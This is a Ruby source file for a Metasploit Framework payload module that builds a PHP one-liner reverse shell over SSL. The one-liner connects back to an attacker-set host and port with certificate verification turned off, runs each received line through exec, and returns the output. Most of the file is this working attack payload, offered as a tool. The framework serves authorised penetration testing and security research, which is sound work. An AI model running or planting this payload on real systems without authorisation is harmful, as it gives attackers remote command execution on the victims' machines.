##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 279

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP SSL (via php)',
        'Description' => 'Creates an interactive shell via php, uses SSL',
        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
        'License' => BSD_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcpSsl,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'php',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('PHPPath', [true, 'The path to the PHP executable', 'php'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    lhost = Rex::Socket.is_ipv6?(datastore['LHOST']) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    "#{datastore['PHPPath']} -r '$ctxt=stream_context_create([\"ssl\"=>[\"verify_peer\"=>false,\"verify_peer_name\"=>false]]);while($s=@stream_socket_client(\"ssl://#{lhost}:#{datastore['LPORT']}\",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}}'&"
  end
end
